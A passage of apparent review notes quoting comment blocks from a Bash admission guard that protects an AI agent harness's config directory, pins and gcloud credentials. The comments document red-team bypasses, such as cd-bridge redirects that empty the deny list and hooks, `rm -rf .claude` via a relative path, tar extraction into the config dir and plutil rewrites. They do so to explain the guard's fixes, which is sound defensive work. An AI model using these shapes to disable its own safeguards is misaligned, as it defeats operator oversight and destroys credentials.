false-positive fix worse than the false positive.

DEGRADES CLOSED. No table means return 1, the veto is withdrawn, and the rule
decides exactly as it does today.

AN UNRESOLVED PATH ANYWHERE WITHDRAWS THE VETO, and that arm is what makes
this helper safe at all (Codex P1 on #470). The two layers disagree about
expansion ON PURPOSE: floor_bash_targets emits an EXPANDED variant so the flat
rule sees `bun <surface>`, while FLOOR_SEGS keeps the literal `$S`. Without
this arm the helper reads the table, finds the only literal surface sitting
under a reader, and vetoes a block the parent version makes:
    S=<a workflow>; bun "$S"                         BLOCK before and after
    S=<a workflow>; bun "$S"; wc -l <the same file>  BLOCK before, ALLOW after
so APPENDING A DUMMY READER would have switched the interpreter protection off
for every variable-expanded surface. Measured both spellings, a workflow and
<cfg>/settings.json, and it is why this shipped with the arm rather than
without it.

Doubt about which path a segment names is therefore resolved by refusing to
veto — this file's standing rule, stated three times above: any doubt means
not read-only. The residual is named rather than hidden: a genuine read whose
surface arrives through a variable still blocks when an interpreter shares the
compound. Fixing THAT means expanding per segment, which is a change to the
segment table and not to a rule that reads it.
```

## bin/admission-bash.sh, lines 2971-2973 (before this edit)

```text
A path this pass cannot resolve makes every conclusion below a guess.
Checked on WORDS and ARGS alike: either can be the one that resolves to
the surface.
```

## bin/admission-bash.sh, lines 2993-2996 (before this edit)

```text
Pass 14 B-sd-2: ex/vi/vim/ed rewrite their file operand, and awk writes through print/printf >,
a pipe, system() or gawk -i inplace. Neither sat in any list, so a literal surface path got through.
An awk program that only reads a surface still passes (tok-206). Asked per segment, so a
writing awk in one segment and a read of a surface in the next is not one finding.
```

## bin/admission-bash.sh, lines 3040-3070 (before this edit)

```text
jq/cat/grep only READ unless a write sink is present — blocking a plain
`jq .permissions.deny settings.json` was friction with no security value.

THE SINK LIST IS NARROWER THAN IT LOOKS, because `>`, `>>` and `| tee` were
never this rule's to catch and it could not catch them correctly. It accepted a
bare `>` ANYWHERE after the surface without ever asking where the redirect
POINTS, so four ordinary read-only commands exited 2 (measured at fc5059d):

  jq -e . ~/.claude/settings.json >/dev/null 2>&1   ← validity check, discards
  jq . ~/.claude/settings.json 2>/dev/null          ← stderr, not the file
  jq . ~/.claude/settings.json >&2                  ← stderr, not the file
  jq . ~/.claude/settings.json > /tmp/scratch.json  ← reads INTO a scratch file

That is the shape §2.11 names: a guard that blocks ordinary work gets switched
off, and the first of those is how you verify an install did not corrupt
settings.json — so the rule punished exactly the check that catches the damage
it exists to prevent.

Deleting them loses NOTHING, and that is verified rather than assumed: the
sibling rules key on the redirect TARGET and so decide correctly where this one
guessed. `jq . <surface> > <surface>` and `>> <surface>` block as
redirect-floor-surface; `| tee <surface>` blocks as mutate-aimed-surface. Both
were fired against this build and both still block. What is left here is the
set no sibling covers: sponge, which writes back to its own input by design and
names no target to key on, and a TRAILING in-place flag, whose leading form now
lives with sed and perl above where the ordering is right.
The trailing flag needs the SAME left boundary as the leading one, and for the
same measured reason: without it a filename ending in -i counted as a request
to edit in place. `jq -r .x <surface> /tmp/data/2024-i` and
`jq -r .x <surface> > /tmp/out-i` both blocked at cce4ea3 — the second is the
very read-into-scratch class this rule had just been narrowed to allow.
```

## bin/admission-bash.sh, lines 3084-3123 (before this edit)

```text
── harbor#280 · THE CONFIG DIRECTORY, NOT JUST ITS PINNED SURFACES ──────────
THE RULE THIS REPLACES CLAIMED THE DIRECTORY AND DELIVERED THE BASENAME. It read
    hit "(>|?|>>)[[:space:]]*${CFGDIR_RE}/*([[:space:]]|$)"
and its message was "shell redirect aimed at the Helm config directory itself" —
but `${CFGDIR_RE}/*` had to be followed by whitespace or end-of-line, so it
matched only a redirect at the BARE directory, which the shell refuses anyway.
`echo hi > <cfg>/notes.txt` never matched it and was ALLOWED. Measured
2026-08-23 on a throwaway floor install, exit 0, alongside `date >>
<cfg>/scratch.log`. The pinned-surface case blocked, as redirect-floor-surface —
a DIFFERENT rule — so the behaviour was surfaces-only while the message
advertised the directory. harbor#280 found it by asking which rules the corpus
can reach, the first instrument in this repo that can tell "blocked" from
"blocked by the rule you think".

THE POSTURE IS THE OPERATOR'S CALL AND IT WAS MADE: block writes under the
config dir, EXCEPT an allowlist of the subtrees a session legitimately writes.
§3 is why — that directory holds identity, credentials, session history and
work-log content — and surfaces-only left a session free to create and append
anywhere in it that is not a pinned file.

THE ALLOWLIST IS SHORT, AND `.helm-pins` IS DELIBERATELY NOT IN IT. An earlier
draft of the options put it there; that would have been a defect. `.helm-pins`
holds B6's content pins — the mechanism that notices a gutted guard — so a
session that can rewrite a pin can disarm the detector that watches the floor.
It stays a surface, blocked. What IS allowlisted is the two subtrees whose whole
purpose is to be written by sessions: MEMORY (the durable store, the work-log,
never MEMORY/OBSERVABILITY, a surface since harbor#1181) and projects (per-project memory and transcripts).
Nothing else on this box has a session-write story: cache, sessions, plans,
file-history and the rest are harness-managed, and a session reaching them
through Bash is not ordinary work.

READS ARE UNTOUCHED, which is most of §2.11's surface here. `cat`, `ls`, `grep`
and `diff` anywhere under the config dir stay allowed — this keys on a redirect
TARGET, and auditing the floor is the work that finds the floor's bugs.

PER-REDIRECT, VIA THE SEGMENT TABLE, NOT A FLAT REGEX. A flat `hit A && { hit B
|| block }` would have been shorter and wrong: with two redirects in one command
the allowlisted one satisfies B and waives the block for the other, so
    echo a > <cfg>/MEMORY/x ; echo b > <cfg>/notes.txt
would walk. Each redirect target is judged on its own.
```

## bin/admission-bash.sh, lines 3141-3166 (before this edit)

```text
RE-PINNING IS THE OPERATOR'S ACT, NOT THE SESSION'S — but this is NOT the
place to enforce it, and the attempt to do so here was withdrawn in pass 10.

The rule that stood here matched the pinner's filename in the command text,
anchored on a config-dir prefix. Pass 10 produced SIX findings from that one
rule, in both directions at once:
  • four spellings walked straight past it — the repo copy with the dir as an
    ARGUMENT, a bare invocation (which DEFAULTS to the live dir), a `cd <cfg>
    &&` bridge, and a copy of the script made somewhere else. Inject-then-
    bless was demonstrated end-to-end through the allowed spelling.
  • and it blocked ordinary text: `sed -n '/admission-install.sh --live/p'
    docs/explanation/admission-baseline.md` and `git commit -am "…admission-deny.sh --live…"` were refused as
    "a --live floor operation", because reading a document that quotes a
    command is indistinguishable from running it to a substring match.

The lesson is structural, not a missing branch: "is this command RUNNING that
script against that directory?" is not decidable from command text. The check
belongs where the answer is certain — INSIDE the tool, which knows its own
resolved target. pin-instructions.sh and baseline-pin.sh now carry the same
in-script live-dir refusal that floor-deny/floor-install/floor-uninstall/
sec0-harden already had, and lint rule D2 holds all six to it.

Residual, stated plainly in docs/explanation/admission-baseline.md: a session with unrestricted Bash can
still silence the B8 advisory. Only B1's tool-level deny and OS permissions
stand behind that, and neither covers a Bash redirect. B8 is a detection
control; it was never a containment one.
```

## bin/admission-bash.sh, lines 3168-3193 (before this edit)

```text
`cd <config dir> … <mutate> <bare filename>` — after the cd the target is a
relative name with no path to match on (red-team pass 2). The bridge only
reached the NEXT segment, so inserting any third command escaped it
(`cd ~/.claude && ls && echo {} > settings.json` — proven end-to-end to zero
the deny array and every hook). The cd is now STICKY for the whole command.
The trigger needs a BOUNDARY after the config path: without one, any directory
merely starting with the same spelling (~/.claudex, ~/.claude-notes) armed
sticky mode and blocked unrelated work (red-team pass 6, false positive).

THE BRIDGE ARMED ON ONE HOP (pass 13, P13-fs-01). The regex below can only see
the config dir when a SINGLE cd spells it in a SINGLE word — `[^;&|]*` cannot
cross a separator — so `cd ~ && cd .claude && echo {} > settings.json` armed
nothing, and neither did the `;` spelling or `pushd ~ && cd .claude && …`,
which is not a `cd` at all. All three reach the same settings.json; all three
measured rc=0.

The argv question in front now decides it: floor_seg_cwd_under FOLDS the whole
cd/pushd chain out of the segment table and compares the resulting path to the
config dir BY COMPONENT. Hop count, ordering, `..` and `./` stop mattering,
and `~/.claude-notes` stays out because it is not below `~/.claude` — no
longer because a character class remembered to say so.

The flat regex STAYS, second: it is the fold's fallback for a payload over
FLOOR_MAX_NORM, where floor_seg_load returns an empty table and every argv
question in this file goes silent. Padding a command must not switch a rule
off (QA plan R4).
```

## bin/admission-bash.sh, lines 3194-3211 (before this edit)

```text
THE CD-BRIDGE, ANSWERED WHERE IT IS ASKED (edge pass 2026-08-29, docs/explanation/admission-baseline.md
P12-argv-01). The rule below arms when the command is STANDING in the config
dir. It never armed for the commoner spelling — standing NEXT to it and
reaching in by a relative name — so `cd ~ && rm -rf .claude` and its `;`,
`pushd` and subshell variants all exited 0 while 'rm -rf ~/.claude' blocked.
Deleting the whole config dir is not a lesser event than editing one file in
it, and it was the only one of the two that was allowed.

ONLY THE UNAMBIGUOUS VERBS. `rm`, `shred` and `truncate` destroy whatever they
name, in any operand position. `cp`, `mv`, `ditto` and `rsync` are deliberately
ABSENT: their config-dir operand may be the SOURCE, and docs/explanation/admission-baseline.md already
records three false positives (P12-argv-fp-01/02/03) from rules that matched a
surface without asking which side of the copy it was on. Adding them here would
reproduce that class rather than learn from it.
`=` PREFIX MEANS EXACT. The config dir is passed exact and its teeth as
subtrees, because `~/.claude` is WRITABLE by design (B8) — matching the whole
subtree made `cd ~/.claude/MEMORY && rm stale-note.md` a blocked command, and
the suite said so as S7 before this line was a commit.
```

## bin/admission-bash.sh, lines 3219-3239 (before this edit)

```text
── THE SAME BRIDGE FOR mv AND cp (harbor#362 follow-on) ────────────────────
RECORDED AS A RESIDUAL WHEN THE rm BRIDGE SHIPPED, and closed here. `cd ~ && rm
.claude/settings.json` was blocked while `cd ~ && mv .claude/settings.json /tmp`
walked straight past it, which is the same loss of the same file by a verb the
rule did not name. Measured 2026-08-30 against the shipped guard: the rm shape
BLOCKED and all four mv/cp shapes ALLOWED.

THE TWO VERBS NEED DIFFERENT RULES, and collapsing them is precisely the mistake
docs/explanation/admission-baseline.md records three times (P12-argv-fp-01/02/03): a rule that matched a
config-dir operand without asking which side of the copy it sat on.

  mv  ANY operand. Both directions destroy: moving a pinned file OUT loses it,
      moving something IN overwrites it. There is no reading of `mv` where a
      protected path is a harmless operand.
  cp  DESTINATION ONLY. `cp <cfg>/settings.json /tmp/backup` is a READ, and
      taking a backup is ordinary work that must stay allowed — that is the
      false-positive class, not a hypothetical. Only the write is blocked.

`cd ~/.claude && mv settings.json /tmp` is NOT this rule and never was: standing
INSIDE the config dir is already cd-cfg-then-mutate, which was verified blocking
before this was written. This covers standing OUTSIDE and reaching in.
```

## bin/admission-bash.sh, lines 3253-3277 (before this edit)

```text
── THE GCLOUD CREDENTIAL STORE (incident 2026-09-03) ────────────────────────
MEASURED THAT DAY: every file under ~/.config/gcloud carried an mtime newer
than 18:26 — the tree was destroyed and recreated inside one session. Lost with
it were the ADC for two workload roles and `tools`,
the matching `-write` role dirs and `me`, and one `oauth-clients/` desktop client file. Recovery cost a
console trip and five interactive browser logins, because Google refuses its
shared gcloud client for a workload API's scopes ("This app is blocked",
2026-07-30) and that ONE file is the only route back.

Baseline before this block, measured against the shipped guard: all nine
destructive shapes below exited 0. The store had no coverage at all.

THIS RULE DID NOT CATCH THE INCIDENT AND CANNOT CLAIM TO. No delete of that
path appears in .zsh_history or in any session transcript, so the actor is
unidentified and may be one this guard never sees — a Finder drag leaves no
trace in either record. Defence in depth on a path that turned out to be
expensive; the recoverable copy (`gcloud-creds snapshot`) is the control that
would actually have saved the day, and it is not in this file.

EXACT FOR THE DIRECTORIES, SURFACE REGEX FOR THE FILES — the same scoping S7
forced on the config dir, and for the same reason. The store is WRITABLE by
design: 'rm ~/.config/gcloud/identities/<role>/expected-account' and
'rm -rf ~/.config/gcloud/logs' are both real commands from this operator's
history, and a subtree match would block both. Those two are asserted as
controls, not left to judgement.
```

## bin/admission-bash.sh, lines 3327-3333 (before this edit)

```text
RESIDUAL, NAMED RATHER THAN QUIETLY LEFT: a FLAT `cp /tmp/x <store>/…/adc.json`
is not covered. `floor_seg_has` cannot ask which side of the copy an operand sat
on, and matching any operand would block `cp <adc> /tmp/backup` — taking a
backup, which is the false-positive class docs/explanation/admission-baseline.md records three times and the
exact work `gcloud-creds` exists to encourage. The cd-bridge form below IS
covered, because that helper has --dest-only. Closing the flat half needs a
position-aware argv helper, which is a separate change.
```

## bin/admission-bash.sh, lines 3352-3416 (before this edit)

```text
THE VERB LIST IS ANCHORED ON BOTH SIDES. It had a boundary on the left and
none on the right, so every verb also matched as a SUBSTRING of an operand —
and `tee` sits inside `.helm-floor-teeth`, a name this very rule lists in
FILES. The floor's own pinned surface armed the rule by being named, `[^;&|]*`
then walked to any later surface, and operand ORDER decided the verdict:
    ls -la .helm-floor-teeth settings.json   rc=2
    ls -la settings.json .helm-floor-teeth   rc=0   ← same two files
Also `notes.rm.bak`, `a-ln-b`, `x/dd-dump`, `my-tee-notes`. What it cost was
precisely the read-only inspection the B8 advisory INSTRUCTS the operator to
do before re-pinning — `diff`, `wc -c`, `file`, `git log --` across two floor
surfaces all exited 2 (harbor#222, §2.11).

A real invocation always has a separator after the verb, so requiring one
costs no true positive: 'rm -f', `tee f`, `sed -i`, `cp a b`, 'chmod 777 f'.
`>` keeps NO right boundary — it is a redirect operator, not a word, and
`>settings.json` with no space is its ordinary spelling.

TWO hits, because the DIRECTORY branch owns a boundary the file branch does
not. `[[:space:]](bin|hooks)` used the same space as its own left anchor —
the one keeping `my-cabin` and `sbin` out — and the verb's new right anchor
ate it, so `cd <cfg> && mv hooks hooks.off` stopped blocking (floor-test V4,
caught by the suite, not by review). Splitting them lets the directory rule
spell its anchor as "start of the operand list, or after a space" instead of
borrowing one it no longer has.

`sed` IS NOT IN THIS LIST. Every other verb here writes by existing; sed only
writes with an in-place flag, and without that test a read-only `sed -n '1,5p'
bin/library-admission.sh` inside the config dir was refused — the gate blocking the
auditing of the gate, measured rc=2 in both the one-hop and the chained
spelling (harbor#116, §2.11). It is handled below, on the same in-place
predicate the surface rule already uses, so there is ONE definition of "this
sed writes" in the file rather than a second one to keep in step.
THE LEFT ANCHOR EXCLUDES A DASH, and harbor#222 above is why it has to say so
separately. That fix gave the verb list a boundary on the RIGHT, which killed
`tee` inside `.helm-floor-teeth` and the `a-ln-b` family it names — a verb
followed by a dash stopped matching. A verb PRECEDED by one did not: `-` is
not alphanumeric and not `_`, so it satisfied this anchor, and A FLAG CLUSTER
PARSED AS A COMMAND. Measured on d029db0, seven reads refused inside the
config dir (harbor#289, §2.11):
    ls -ln bin · sort -ln bin/library-admission.sh · grep -ln p bin/*.sh · java -cp …
    ls a-ln settings.json · ls notes-rm settings.json · ls x-tee settings.json
Cluster ORDER was the whole difference — `-nl` and `-l -n` were both allowed —
so the anchor was the cause, not the verb list. The last three are the family
harbor#222 believed it had closed: it pinned `a-ln-b`, where the verb is
followed by a dash, and never asked about `a-ln`, where it is preceded by one.
Third §2.11 defect on this one rule after harbor#116 (`sed -n`) and harbor#222,
all three the same shape: the gate blocking the auditing of the gate.

`/` MUST STAY ACCEPTED — `cd <cfg> && /bin/rm bin/admission-bash.sh` is a real
spelling and is pinned. So this is a dash exclusion, not a switch to a
separator class.

`git-` IS AN ANCHOR IN ITS OWN RIGHT, because excluding the dash outright let
`git-rm bin/admission-bash.sh` through — git's dashed aliases are real programs
(measured at `git --exec-path`, which carries git-rm and git-mv), and the
left context of `git-rm` is indistinguishable from that of `a-ln`. Not on this
PATH today, which is a fact about this PATH and not a boundary. So the dash is
excluded generally and the one reachable dashed form is named. ONE verb list,
two anchors — the alternative was a second copy of the list to keep in step,
which the `sed` note above already argues against.

THE REDIRECT BRANCH KEEPS THE ORIGINAL ANCHOR, so no redirect that blocks
today can stop blocking because of this change. `(^|` is not an option in any
of them: lint F2 forbids a mid-pattern alternation with it, and BSD grep never
matches that branch.
```

## bin/admission-bash.sh, lines 3432-3442 (before this edit)

```text
sed, in place only — and in BOTH operand orders, which is the half a
leading-flag pattern would have silently dropped. `sed s/a/b/ settings.json -i`
blocks today because the old rule asked nothing about flags at all, so
mirroring the surface rule's leading-only ordering would have fixed a false
positive by opening a false negative. GNU sed accepts options after operands;
that the BSD sed on this box does not is a property of this box, not of the
payloads it may be handed.

$_IPF and hit_cs are the surface rule's, unchanged: the flag is a TOKEN not a
substring, `-i.bak`/`-i ''`/`-Ei`/`-ni`/`--in-place` all count, and the
case-strict second pass is what keeps `-I` (yq's indent) from reading as `-i`.
```

## bin/admission-bash.sh, lines 3452-3469 (before this edit)

```text
harbor#280, the cd half. The rule here keyed on ${FILES} — the pinned-surface
BASENAMES — so it was shadowed twice over: cd-cfg-then-mutate above already
covers ${FILES} and its `_MUT` includes `>`, so it fired first on every input
this could have caught. Measured 2026-08-23: `cd <cfg> && echo x >
settings.json` blocks as cd-cfg-then-mutate, while `cd <cfg>; echo hi >
notes.txt` was ALLOWED. Same defect as its sibling one section up, same fix.

THE cwd IS KNOWABLE HERE and that is the whole reason this block exists: the
cd is in the same command, so a RELATIVE redirect target resolves inside the
config dir. An ABSOLUTE one does not, and must stay allowed — `cd <cfg> &&
cmd > /tmp/out` is ordinary work, as is `> ../x`, which leaves the directory.

`&1` IS NOT A FILE, and this is the false positive that shape invites: the
redirection table records `2>&1` with target `&1`, which is relative-looking
and matches no allowlist. Blocking `cd <cfg> && cmd 2>&1` would refuse the
single most common spelling in this repo's own scripts, which is §2.11's
definition of a guard that gets switched off. Excluded by prefix, with the
suite pinning it.
```

## bin/admission-bash.sh, lines 3480-3493 (before this edit)

```text
THE SHAPE WITH NO PATH IN IT (pass 13, measured at exit 0 — the brief that
commissioned this fix assumed it was already blocked, and it was not).
`cd ~/.claude && tar xzf /tmp/evil.tgz` extracts into the CURRENT directory,
so no argument names the config dir and every path-matching rule above —
argv and flat alike — sees a tar whose only operand is under /tmp. It is
docs/explanation/admission-baseline.md pass 10's own bypass with the destination left implicit.

This is the one place the cwd is knowable: the cd is right there in the same
command. Elsewhere a bare `tar xzf x.tgz` stays allowed, because a hook is
not told the working directory and refusing every extraction everywhere is
the false positive that gets a guard switched off.

The verb list above cannot be extended to cover it: it matches a mutating
verb next to a NAMED surface, and here there is no name to match.
```

## bin/admission-bash.sh, lines 3496-3518 (before this edit)

```text
AND THE SAME SHAPE FOR plutil (P13-fs-04). `cd ~/.claude && plutil -replace
permissions.deny -json '[]' settings.json` names no path at all, so the argv
rule above — which asks whether a written token is at or below the config
dir — cannot see it. The previous attempt at this family shipped three rules
all sitting OUTSIDE this fold and was refused for it: the cd bypass was
already closed one commit earlier for redirects, and a new rule that ignores
it hands the same escape back.

cd-cfg-then-mutate.flat above cannot be extended to cover this: its verb list
matches a mutating verb NEAR a surface name, and adding `plutil` there would
block `cd ~/.claude && plutil -p settings.json` — a pure read, and §2.11.
Mode has to be consulted, so the arm reads the same computed write-target
list, and the -o exemption comes with it (`cd ~/.claude && plutil -convert
json -o - settings.json` stays allowed).

THE TARGET TEST IS A RELATIVE NAME, matched to the same set the two flat arms
above use — $FILES, a guard/floor script, or a path under bin/ or hooks/.
"Any relative target" would be more complete and is deliberately not used:
the fold also arms on its FLAT trigger, which can fire when the folded cwd is
NOT under the config dir (`cd <cfg>/bin && cd /tmp && …`), and a broad arm
would then block a write to /tmp. Residual, stated: `cd <cfg> && plutil
-create json skills/x/other.json` is not caught — it writes a non-surface
file inside the config dir.
```

## bin/admission-bash.sh, lines 3529-3534 (before this edit)

```text
── PROJECT-POLICY shapes — deferred only to a wired repo guard (B5, harbor#954) ─
Protected-branch force-push / hard reset. Where the governing repo wires
github_command_guard (a PreToolUse hook, or the scaffolder's lifecycle plugin
installed and enabled), that guard owns this and we must not double-ask.
Anywhere else — no repo, or a marked repo with no such guard — the floor is the
sole gate: handing the rule off on a marker alone left those repos unguarded.
```

## bin/admission-bash.sh, lines 3567-3570 (before this edit)

```text
The TERMINAL clean pass — a command this guard actually judged and allowed.
The early bails above (not-my-tool, empty payload) deliberately emit nothing:
they are the guard declining to look, not an allow, and counting them poisons
the denominator of the false-positive rate this ledger exists to make honest.
```
